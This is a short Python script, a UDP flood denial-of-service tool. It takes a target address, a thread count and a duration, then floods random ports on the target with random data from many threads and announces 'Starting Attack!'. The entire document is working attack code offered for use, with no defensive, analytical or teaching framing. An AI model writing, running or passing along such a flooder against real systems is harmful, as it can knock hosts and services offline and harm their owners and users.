import random, time, sys, socket, threading

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print(f'\033[31mUse command: python {sys.argv[0]} <target> <threads> <time>\033[m')

else:

    timeout = time.time() + 1 * timer


    def attack():
        sent = 0
        try:
            bytes = random._urandom(1024)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < timeout:
                dport = random.randint(20, 55500)
                sock.sendto(bytes*random.randint(5, 15), (target, dport))
            return

        except:
            pass


    print('[+] Starting Attack!')
    for i in range(0, threads):
        threading.Thread(target=attack).start()


    print('[+] Attacking Done!')
    